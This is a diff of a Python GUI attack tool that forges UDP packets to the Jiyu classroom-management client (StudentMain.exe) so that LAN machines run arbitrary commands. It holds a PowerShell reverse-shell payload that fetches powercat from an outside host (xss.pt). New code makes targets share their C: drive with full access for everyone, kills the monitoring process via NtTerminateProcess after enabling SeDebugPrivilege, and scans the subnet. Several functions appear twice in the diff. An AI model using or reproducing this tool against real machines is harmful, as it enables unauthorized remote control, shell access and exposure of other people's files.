@@ -4,16 +4,23 @@ import random
 import threading
 import re
 import subprocess
+from multiprocessing import Process, Queue
 from time import sleep
 from struct import pack
 from os import popen, system
-
-from PyQt6.QtCore import pyqtSignal
+import multiprocessing
+from PyQt6.QtCore import pyqtSignal, QTimer
 from PyQt6.QtWidgets import (
     QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
     QLineEdit, QLabel, QPushButton, QTextEdit, QComboBox, QDialog, QScrollArea, QDialogButtonBox, QProgressBar,
     QCheckBox
 )
+from PyQt6.QtGui import QFont
+import win32api
+import win32con
+import win32security
+import ctypes
+
 
 # ----------------------------
 store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7, 0x52, 0x40, 0x91,
@@ -32,9 +39,8 @@ basicCMD = {
 }
 # ----------------------------
 
-
 def format_b4_send(content):
-    """将字符串转换为十六进制数组（原始代码格式化方法）"""
+    """将字符串转换为十六进制数组"""
     arr = []
     for ch in content:
         tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
@@ -53,7 +59,7 @@ def format_b4_send(content):
 
 
 def get_ip(ip):
-    """解析 -ip 参数，支持单个IP、IP范围（如 "192.168.80.10-56"）以及 C 段（如 "192.168.80.23/24"）"""
+    """解析 -ip 参数，支持单个IP、IP范围（如 "192.168.80.10-56"）以及 C 段（/24）"""
     target_host = []
     if '.' not in ip:
         return target_host
@@ -77,7 +83,7 @@ def get_ip(ip):
 
 
 def pkg_sendlist(cmdtype, content):
-    """将文本内容写入对应模板中：-msg 从下标 56，-c 从下标 578"""
+    """将文本内容写入对应模板中：-msg从下标56，-c从下标578"""
     arrs = format_b4_send(content)
     if cmdtype == '-msg':
         index = 56
@@ -99,7 +105,7 @@ def pkg_sendlist(cmdtype, content):
 
 
 def pkg_send_extra_option(option):
-    """根据额外选项构造数据包，固定填充到 156 字节"""
+    """根据额外选项构造数据包，固定填充到156字节"""
     mapping = {
         "r": "RBT_",
         "s": "SHT_",
@@ -114,8 +120,8 @@ def pkg_send_extra_option(option):
     return payload
 
 
-# 自动检测本机网卡的 /24 网段
 def get_local_networks():
+    """自动检测本机所有私有IP对应的 /24 网段"""
     networks = []
     try:
         hostname = socket.gethostname()
@@ -126,13 +132,61 @@ def get_local_networks():
                 net = ".".join(ip.split('.')[:3]) + ".0/24"
                 if net not in networks:
                     networks.append(net)
-    except Exception as e:
+    except Exception:
         pass
     return networks
 
 
-# ----------------------------
-# 以下为独立功能
+# ==============================
+# 内网扫描：在独立进程中执行
+# ==============================
+def scan_process(ip_text, log_queue):
+    """
+    在独立进程中执行扫描，通过 Queue 传回日志和进度（整数进度）
+    """
+    ips = get_ip(ip_text)
+    if not ips:
+        log_queue.put("[-] IP格式错误，无法解析网段")
+        return
+    log_queue.put("[*] 开始扫描网段，请稍候...")
+    counter = 0
+    active_ips = []
+    semaphore = threading.Semaphore(50)
+    lock = threading.Lock()
+
+    def ping_ip(ip):
+        nonlocal counter
+        with semaphore:
+            try:
+                result = subprocess.run(["ping", "-n", "1", "-w", "100", ip],
+                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                with lock:
+                    counter += 1
+                    log_queue.put(counter)  # 整数进度
+                if result.returncode == 0:
+                    active_ips.append(ip)
+                    log_queue.put(f"[+] {ip} 在线")
+                else:
+                    log_queue.put(f"[-] {ip} 无响应")
+            except Exception as e:
+                log_queue.put(f"[-] {ip} 扫描错误: {e}")
+
+    threads = []
+    for ip in ips:
+        t = threading.Thread(target=ping_ip, args=(ip,))
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+    if active_ips:
+        log_queue.put("[*] 扫描完成。在线主机: " + ', '.join(active_ips))
+    else:
+        log_queue.put("[-] 扫描完成。无在线主机。")
+
+
+# ==============================
+# 下面为各功能实现
+# ==============================
 def action_get_ip_port(log_callback):
     try:
         hostname = socket.gethostname()
@@ -145,13 +199,16 @@ def action_get_ip_port(log_callback):
             log_callback("[-] 未能获取到学生端进程信息")
             return
         pid = m.group()[1:-1].strip()
-        netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
-        pattern = re.compile(r"%s:\d{1,5}\s*\*{1}" % ip)
+        netstat = popen(f'netstat -ano |find "{pid}"').read()
+        pattern = re.compile(rf"{ip}:\d{{1,5}}\s*\*{{1}}")
         netstat_pat = pattern.findall(netstat)
-        ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
-        log_callback("[+] Your student client possible ports are: " + ', '.join(ports))
+        ports = [i.strip(ip)[1:-1].rstrip() for i in netstat_pat]
+        if ports:
+            log_callback("[+] Possible student client ports: " + ", ".join(ports))
+        else:
+            log_callback("[-] 未能检测到学生端端口")
     except Exception as e:
-        log_callback("[-] 获取IP/端口错误: " + str(e))
+        log_callback(f"[-] 获取IP/端口时出错: {e}")
 
 
 def action_break_screen(log_callback):
@@ -163,7 +220,7 @@ def action_break_screen(log_callback):
         sleep(1)
         log_callback("[+] 脱离屏幕控制已执行。")
     except Exception as e:
-        log_callback("[-] 执行 break 错误: " + str(e))
+        log_callback(f"[-] 执行 break 时出错: {e}")
 
 
 def action_continue_screen(log_callback):
@@ -171,69 +228,145 @@ def action_continue_screen(log_callback):
         popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
         log_callback("[+] 恢复屏幕控制已执行。")
     except Exception as e:
-        log_callback("[-] 执行 continue 错误: " + str(e))
+        log_callback(f"[-] 执行 continue 时出错: {e}")
 
 
 def action_netcat(listening_port, target_ip, target_port, log_callback):
+    """
+    反弹 shell 功能示例：
+    listening_port: 本机随机生成的监听端口
+    target_ip: 目标IP（仅单个）
+    target_port: 目标端口
+    """
     try:
         hostname = socket.gethostname()
         local_ip = socket.gethostbyname(hostname)
-        cmd = ("powershell IEX (New-Object System.Net.Webclient).DownloadString("
-               "'https://xss.pt/hYvg');powercat -c {} -p {} -e cmd").format(local_ip, listening_port)
-        data = pkg_sendlist('-c', cmd)
+        cmd = (
+            "powershell IEX (New-Object System.Net.Webclient).DownloadString("
+            "'https://xss.pt/hYvg');powercat -c {} -p {} -e cmd"
+        ).format(local_ip, listening_port)
+        data_list = pkg_sendlist('-c', cmd)
+        data = bytes(data_list)
         client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         payload = pack("%dB" % len(data), *data)
         client.sendto(payload, (target_ip, target_port))
         client.close()
-        log_callback("[+] 反弹 shell 命令已发送，监听端口: " + str(listening_port))
-        log_callback("[*] 请在 PowerShell 中执行监听命令以接收反弹 shell。")
+        log_callback(f"[+] 反弹 shell 命令已发送，监听端口: {listening_port}")
+        log_callback("[*] 请在本机 PowerShell 中执行监听命令以接收连接。")
     except Exception as e:
-        log_callback("[-] 反弹 shell 错误: " + str(e))
+        log_callback(f"[-] 反弹 shell 出错: {e}")
 
-
-def action_scan_network(ip_text, log_callback, progress_callback):
-    ips = get_ip(ip_text)
-    if not ips:
-        log_callback("[-] IP格式错误，无法解析网段")
+def action_share_local_disk(ip_text, port, loop_count, interval, content, log_callback):
+    r"""
+    让目标机共享它自己的磁盘功能示例：
+    在消息/命令内容中填写共享参数，例如 "MyC=C:\"
+    程序构造命令：cmd.exe /c net share MyC=C:\ /grant:everyone,full
+    """
+    if not content:
+        log_callback("[-] 请填写共享参数，例如 'MyC=C:\\'")
         return
-    log_callback("[*] 开始扫描网段，请稍候...")
-    total = len(ips)
-    counter = [0]
-    active_ips = []
-    semaphore = threading.Semaphore(35)  # 限制并发线程数量
+    # 构造共享命令，注意反斜杠需要正确书写
+    cmd = f'cmd.exe /c net share {content} /grant:everyone,full'
+    data_list = pkg_sendlist('-c', cmd)
+    data = bytes(data_list)
+    targets = get_ip(ip_text)
+    log_callback("[*] 发送本地共享命令...")
 
-    def ping_ip(ip):
-        nonlocal counter
-        with semaphore:
+    def send_task(ip):
+        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        for i in range(loop_count):
             try:
-                result = subprocess.run(["ping", "-n", "1", "-w", "100", ip],
-                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                with threading.Lock():
-                    counter[0] += 1
-                    progress_callback(counter[0])
-                if result.returncode == 0:
-                    active_ips.append(ip)
-                    log_callback(f"[+] {ip} 在线")
-                else:
-                    log_callback(f"[-] {ip} 无响应")
-            except Exception as e:
-                log_callback(f"[-] {ip} 扫描错误: {e}")
+                payload = pack("%dB" % len(data), *data)
+                client.sendto(payload, (ip, port))
+                log_callback(f"[+] 发送到 {ip}:{port} 第 {i+1} 次")
+            except Exception as ex:
+                log_callback(f"[-] {ip} 发送错误：{ex}")
+            if i != loop_count - 1:
+                sleep(interval)
+        client.close()
 
-    threads = []
-    for ip in ips:
-        t = threading.Thread(target=ping_ip, args=(ip,))
-        t.start()
-        threads.append(t)
-    for t in threads:
-        t.join()
-    if active_ips:
-        log_callback("[*] 扫描完成。在线主机: " + ', '.join(active_ips))
-    else:
-        log_callback("[-] 扫描完成。无在线主机。")
+    for ip in targets:
+        threading.Thread(target=send_task, args=(ip,)).start()
+
+def action_kill_studentmain_nt(log_callback):
+    """
+    使用 NT API 强制结束 StudentMain.exe 进程
+    """
+    try:
+        output = subprocess.check_output('tasklist /FI "IMAGENAME eq StudentMain.exe"', shell=True).decode()
+        m = re.search(r"StudentMain\.exe\s+(\d+)", output)
+        if m:
+            pid = int(m.group(1))
+            log_callback(f"[+] 找到 StudentMain.exe, PID = {pid}")
+            result = nt_terminate_process(pid, log_callback)
+            if result == 0:
+                log_callback(f"[+] 进程 {pid} 已成功终止 (NT API)")
+            else:
+                log_callback(f"[-] NT API 终止进程 {pid} 失败，返回码: {result}")
+        else:
+            log_callback("[-] 未找到 StudentMain.exe 进程")
+    except Exception as e:
+        log_callback(f"[-] 调用 NT API 失败: {e}")
 
 
-# ----------------------------
-# GUI 部分
+def nt_terminate_process(pid, log_callback):
+    """
+    使用 NT 内部 API NtTerminateProcess 强制结束进程
+    """
+    PROCESS_TERMINATE = 0x0001
+    try:
+        handle = win32api.OpenProcess(PROCESS_TERMINATE, False, pid)
+    except Exception as e:
+        log_callback(f"[-] 打开进程 {pid} 失败: {e}")
+        return None
+    handle_int = int(handle)
+    ntdll = ctypes.WinDLL("ntdll")
+    NtTerminateProcess = ntdll.NtTerminateProcess
+    NtTerminateProcess.argtypes = [ctypes.c_void_p, ctypes.c_uint]
+    NtTerminateProcess.restype = ctypes.c_uint
+    status = NtTerminateProcess(ctypes.c_void_p(handle_int), 1)
+    win32api.CloseHandle(handle)
+    return status
+
+
+def action_share_local_disk(ip_text, port, loop_count, interval, content, log_callback):
+    r"""
+    让目标机共享它自己的磁盘，例如 content="MyC=C:\"
+    这会构造: cmd.exe /c net share MyC=C:\ /grant:everyone,full
+    """
+    if not content:
+        log_callback("[-] 请填写共享参数，例如 'MyC=C:\\'")
+        return
+
+    # 构造共享命令
+    # 假设 content 是形如 "MyC=C:\" 这样的字符串
+    # net share MyC=C:\ /grant:everyone,full
+    cmd = f'cmd.exe /c net share {content} /grant:everyone,full'
+    data_list = pkg_sendlist('-c', cmd)
+    data = bytes(data_list)
+    targets = get_ip(ip_text)
+    log_callback("[*] 发送本地共享命令...")
+
+    def send_task(ip):
+        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        for i in range(loop_count):
+            try:
+                payload = pack("%dB" % len(data), *data)
+                client.sendto(payload, (ip, port))
+                log_callback(f"[+] 发送到 {ip}:{port} 第 {i + 1} 次")
+            except Exception as ex:
+                log_callback(f"[-] {ip} 发送错误：{ex}")
+            if i != loop_count - 1:
+                sleep(interval)
+        client.close()
+
+    for ip in targets:
+        threading.Thread(target=send_task, args=(ip,)).start()
+
+
+# ==============================
+# InfoDialog：使用说明
+# ==============================
 class InfoDialog(QDialog):
     def __init__(self, parent=None):
         super().__init__(parent)
@@ -243,17 +376,19 @@ class InfoDialog(QDialog):
         info_text = (
             "【关于】\n"
             "本程序由 ht0Ruial 的 Jiyu_udp_attack 改造而成，作者 NULL11034。\n\n"
-            "【使用说明】\n\n"
-            "1. 获取内网IP及学生端端口：选 'g'\n"
-            "2. 脱离屏幕控制（需管理员）：选 'break'\n"
-            "3. 恢复屏幕控制：选 'continue'\n"
-            "4. 发送消息：命令类型 -msg，输入消息（如 \"hello,baby!\"），-ip 支持单个IP、范围或 /24\n"
-            "5. 执行命令：命令类型 -c，输入命令（如 \"calc.exe\" 或 \"cmd.exe /c ipconfig\"）\n"
-            "6. 批量命令执行：在文本框中每行一条命令，并勾选批量模式\n"
-            "7. 反弹 shell：选 'nc'（仅单个IP），工具随机生成监听端口，需提前设置 Powercat 监听\n"
+            "【使用说明】\n"
+            "1. 获取内网IP及学生端口：选择 'g'\n"
+            "2. 脱离屏幕控制（需管理员）：选择 'break'\n"
+            "3. 恢复屏幕控制：选择 'continue'\n"
+            "4. 发送消息：命令类型 -msg，输入消息；-ip 支持单个IP、范围或 /24\n"
+            "5. 执行命令：命令类型 -c，输入命令（如 calc.exe 或 cmd.exe /c ipconfig）\n"
+            "6. 批量命令执行：文本框中每行一条命令，勾选批量模式\n"
+            "7. 反弹 shell：选择 'nc'（仅单个IP），工具随机生成监听端口；请提前配置 Powercat 监听\n"
             "8. 内网扫描：-ip 输入 /24 格式，点击“扫描内网”\n"
-            "9. 多网卡检测：点击“检测本机网卡”自动填充 -ip\n"
-            "10. 循环发送：-l 设置循环次数，-t 设置发送间隔\n\n"
+            "9. 多网卡自动检测：点击“检测本机网卡”自动填充 -ip\n"
+            "10. 循环发送：-l 设置循环次数，-t 设置发送间隔\n"
+            "11. 磁盘共享：选择 'map'，在命令内容中填写共享参数，例如 'MyC=C:\\'\n"
+            "12. 强制结束 StudentMain.exe：选择 'kill'，使用 NT API 强制结束该进程\n\n"
             "注意：请确保目标环境允许UDP数据包重放，并具备相应权限。"
         )
         scroll = QScrollArea()
@@ -267,6 +402,9 @@ class InfoDialog(QDialog):
         layout.addWidget(buttonBox)
 
 
+# ==============================
+# 主窗口
+# ==============================
 class MainWindow(QMainWindow):
     progress_signal = pyqtSignal(int)
     set_max_signal = pyqtSignal(int)
@@ -278,15 +416,19 @@ class MainWindow(QMainWindow):
         self.initUI()
         self.progress_signal.connect(self.progressBar.setValue)
         self.set_max_signal.connect(self.progressBar.setMaximum)
+        self.scan_timer = QTimer()
+        self.scan_timer.timeout.connect(self.poll_scan_log)
+        self.scan_log_queue = None
+        self.scan_process = None
 
     def initUI(self):
         central = QWidget()
         self.setCentralWidget(central)
         main_layout = QVBoxLayout()
 
-        # -ip 输入及多网卡检测区域
+        # -ip 输入及多网卡检测
         ip_layout = QHBoxLayout()
-        ip_label = QLabel("-ip (例如: 192.168.80.12 或 192.168.80.10-56 或 192.168.80.23/24):")
+        ip_label = QLabel("-ip (例如: 192.168.80.101 或 192.168.80.10-56 或 192.168.80.23/24):")
         self.ip_edit = QLineEdit()
         ip_layout.addWidget(ip_label)
         ip_layout.addWidget(self.ip_edit)
@@ -321,7 +463,7 @@ class MainWindow(QMainWindow):
         cmd_layout.addWidget(self.cmd_combo)
         main_layout.addLayout(cmd_layout)
 
-        # 消息/命令内容输入（改为 QTextEdit 支持多行）
+        # 消息/命令内容输入（多行）
         content_layout = QVBoxLayout()
         content_label = QLabel("消息/命令内容:")
         self.content_edit = QTextEdit()
@@ -329,7 +471,7 @@ class MainWindow(QMainWindow):
         content_layout.addWidget(self.content_edit)
         main_layout.addLayout(content_layout)
 
-        # 批量命令执行复选框（仅对 -c 有效）
+        # 批量命令执行复选框
         self.batch_checkbox = QCheckBox("批量命令执行（每行一条命令）")
         main_layout.addWidget(self.batch_checkbox)
 
@@ -337,7 +479,7 @@ class MainWindow(QMainWindow):
         extra_layout = QHBoxLayout()
         extra_label = QLabel("额外选项 (-e):")
         self.extra_combo = QComboBox()
-        self.extra_combo.addItems(["无", "r", "s", "g", "nc", "break", "continue"])
+        self.extra_combo.addItems(["无", "r", "s", "g", "nc", "map", "kill", "break", "continue"])
         extra_layout.addWidget(extra_label)
         extra_layout.addWidget(self.extra_combo)
         main_layout.addLayout(extra_layout)
@@ -359,7 +501,7 @@ class MainWindow(QMainWindow):
         self.progressBar.setValue(0)
         main_layout.addWidget(self.progressBar)
 
-        # 下方增加“使用教程(以及关于)”和“扫描内网”按钮
+        # 按钮区域：使用教程和扫描内网
         buttons_layout = QHBoxLayout()
         info_button = QPushButton("使用教程(以及关于)")
         info_button.setFixedHeight(40)
@@ -416,7 +558,24 @@ class MainWindow(QMainWindow):
             return
         self.set_max_signal.emit(len(ips))
         self.progress_signal.emit(0)
-        threading.Thread(target=action_scan_network, args=(ip_text, self.log, self.progress_signal.emit)).start()
+        self.scan_log_queue = Queue()
+        self.scan_process = Process(target=scan_process, args=(ip_text, self.scan_log_queue))
+        self.scan_process.start()
+        self.scan_timer.start(100)
+
+    def poll_scan_log(self):
+        if self.scan_log_queue is not None:
+            while not self.scan_log_queue.empty():
+                msg = self.scan_log_queue.get()
+                if isinstance(msg, int):
+                    self.progressBar.setValue(msg)
+                else:
+                    self.log(msg)
+        if self.scan_process is not None and not self.scan_process.is_alive():
+            self.scan_timer.stop()
+            self.scan_process.join()
+            self.scan_process = None
+            self.log("[*] 扫描进程结束。")
 
     def startAction(self):
         ip_text = self.ip_edit.text().strip()
@@ -454,6 +613,17 @@ class MainWindow(QMainWindow):
                 rand_port = random.randint(1, 65535)
                 threading.Thread(target=action_netcat, args=(rand_port, targets[0], port, self.log)).start()
                 return
+            elif extra_option == "kill":
+                threading.Thread(target=action_kill_studentmain_nt, args=(self.log,)).start()
+                return
+            elif extra_option == "map":
+                # 磁盘共享功能：要求用户在内容框中填写共享参数，例如 "MyC=C:\"
+                content = self.content_edit.toPlainText().strip()
+                if not content:
+                    self.log("[-] 请填写共享参数，例如 'MyC=C:\\'")
+                    return
+                threading.Thread(target=action_share_local_disk, args=(ip_text, port, loop_count, interval, content, self.log)).start()
+                return
             else:
                 data_list = basicCMD.get('-r') if extra_option == "r" else basicCMD.get('-s')
                 if data_list is None:
@@ -465,13 +635,11 @@ class MainWindow(QMainWindow):
                 self.send_data(targets, port, data, loop_count, interval)
                 return
 
-        # 如果额外选项为“无”
         cmd_type = self.cmd_combo.currentText().strip()
         content = self.content_edit.toPlainText().strip()
         if not content:
             self.log("[-] 请输入消息或命令内容")
             return
-        # 如果批量执行被选中，则按行拆分命令发送（仅适用于命令执行）
         if self.batch_checkbox.isChecked():
             commands = [line.strip() for line in content.splitlines() if line.strip()]
             if not commands:
@@ -498,7 +666,7 @@ class MainWindow(QMainWindow):
                 try:
                     payload = pack("%dB" % len(data), *data)
                     client.sendto(payload, (ip, port))
-                    self.log(f"[+] 发送到 {ip}:{port} 第 {i + 1} 次")
+                    self.log(f"[+] 发送到 {ip}:{port} 第 {i+1} 次")
                 except Exception as ex:
                     self.log(f"[-] {ip} 发送错误：{ex}")
                 if i != loop_count - 1:
@@ -515,8 +683,98 @@ class MainWindow(QMainWindow):
         self.log("[*] 所有数据包发送完成。")
 
 
+def nt_terminate_process(pid, log_callback):
+    """
+    使用 NT 内部 API NtTerminateProcess 强制结束进程
+    """
+    PROCESS_TERMINATE = 0x0001
+    try:
+        handle = win32api.OpenProcess(PROCESS_TERMINATE, False, pid)
+    except Exception as e:
+        log_callback(f"[-] 打开进程 {pid} 失败: {e}")
+        return None
+    handle_int = int(handle)
+    ntdll = ctypes.WinDLL("ntdll")
+    NtTerminateProcess = ntdll.NtTerminateProcess
+    NtTerminateProcess.argtypes = [ctypes.c_void_p, ctypes.c_uint]
+    NtTerminateProcess.restype = ctypes.c_uint
+    status = NtTerminateProcess(ctypes.c_void_p(handle_int), 1)
+    win32api.CloseHandle(handle)
+    return status
+
+
+def action_kill_studentmain_nt(log_callback):
+    """
+    使用 NT API 强制结束 StudentMain.exe 进程
+    """
+    try:
+        output = subprocess.check_output('tasklist /FI "IMAGENAME eq StudentMain.exe"', shell=True).decode()
+        m = re.search(r"StudentMain\.exe\s+(\d+)", output)
+        if m:
+            pid = int(m.group(1))
+            log_callback(f"[+] 找到 StudentMain.exe, PID = {pid}")
+            result = nt_terminate_process(pid, log_callback)
+            if result == 0:
+                log_callback(f"[+] 进程 {pid} 已成功终止 (NT API)")
+            else:
+                log_callback(f"[-] NT API 终止进程 {pid} 失败，返回码: {result}")
+        else:
+            log_callback("[-] 未找到 StudentMain.exe 进程")
+    except Exception as e:
+        log_callback(f"[-] 调用 NT API 失败: {e}")
+
+def adjust_privileges():
+    """
+    启用当前进程的 SeDebugPrivilege 权限，
+    使得程序有更高的调试和终止进程的权限。
+    """
+    try:
+        # 获取当前进程的句柄
+        hProcess = win32api.GetCurrentProcess()
+        # 打开进程的访问令牌
+        hToken = win32security.OpenProcessToken(hProcess, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
+        # 获取 SeDebugPrivilege 的 LUID
+        privilege_id = win32security.LookupPrivilegeValue(None, win32con.SE_DEBUG_NAME)
+        # 准备调整令牌权限：启用 SeDebugPrivilege
+        new_privileges = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
+        win32security.AdjustTokenPrivileges(hToken, False, new_privileges)
+        win32api.CloseHandle(hToken)
+        print("[+] 已成功启用 SeDebugPrivilege")
+    except Exception as e:
+        print("[-] 调整权限失败：", e)
+
+def check_debug_privilege():
+    """
+    检查当前进程是否启用了 SeDebugPrivilege
+    返回 True 表示已启用，否则返回 False
+    """
+    try:
+        hProcess = win32api.GetCurrentProcess()
+        hToken = win32security.OpenProcessToken(hProcess, win32con.TOKEN_QUERY)
+        # 获取令牌中特权的列表
+        privs = win32security.GetTokenInformation(hToken, win32security.TokenPrivileges)
+        # 获得 SE_DEBUG_NAME 对应的 LUID
+        debug_luid = win32security.LookupPrivilegeValue(None, win32con.SE_DEBUG_NAME)
+        for luid, flags in privs:
+            if luid == debug_luid:
+                win32api.CloseHandle(hToken)
+                return bool(flags & win32con.SE_PRIVILEGE_ENABLED)
+        win32api.CloseHandle(hToken)
+    except Exception as e:
+        # 如果发生异常，返回 False
+        return False
+
+# ==============================
+# 程序入口
+# ==============================
 if __name__ == '__main__':
+    adjust_privileges()
+    if check_debug_privilege():
+        print("Check:SeDebugPrivilege 已启用")
+    else:
+        print("Check:SeDebugPrivilege 未启用")
     app = QApplication(sys.argv)
+    app.setFont(QFont("Microsoft YaHei", 10))
     window = MainWindow()
     window.show()
     sys.exit(app.exec())
